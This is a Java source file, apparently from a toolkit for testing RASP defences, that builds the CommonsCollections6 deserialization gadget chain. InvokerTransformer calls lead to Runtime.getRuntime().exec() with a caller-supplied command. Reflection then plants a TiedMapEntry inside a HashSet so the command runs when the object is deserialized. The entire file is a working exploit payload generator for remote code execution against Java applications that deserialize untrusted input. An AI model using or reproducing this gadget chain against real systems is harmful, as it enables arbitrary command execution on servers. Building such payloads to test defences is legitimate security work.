package org.Tools.RASP.util;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import static org.Tools.setFieldValue.setFieldValue;
import static org.Tools.setSerial.serial;

public class CC6 {
    public static Object getObject(final String url) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{url}),
                new ConstantTransformer(1)};
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.lazyMap(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(lazyMap, "x");

        HashSet hashSet = new HashSet(1);
        hashSet.add("test");
        // 反射获取HashSet中map的值
        Field map = Class.forName("java.util.HashSet").getDeclaredField("map");
        // 取消访问限制检查
        map.setAccessible(true);
        // 获取HashSet中map的值
        HashMap hashSetMap = (HashMap) map.get(hashSet);

        // 反射获取 HashMap 中 table 的值
        Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
        // 取消访问限制检查
        table.setAccessible(true);
        // 获取 HashMap 中 table 的值
        Object[] hashMapTable = (Object[]) table.get(hashSetMap);
        Object node = hashMapTable[0];
        if (node == null) {
            node = hashMapTable[1];
        }

        // 将 key 设为 tiedMapEntry
        setFieldValue(node, "key", tme);

        //序列化
        return hashSet;
    }
}
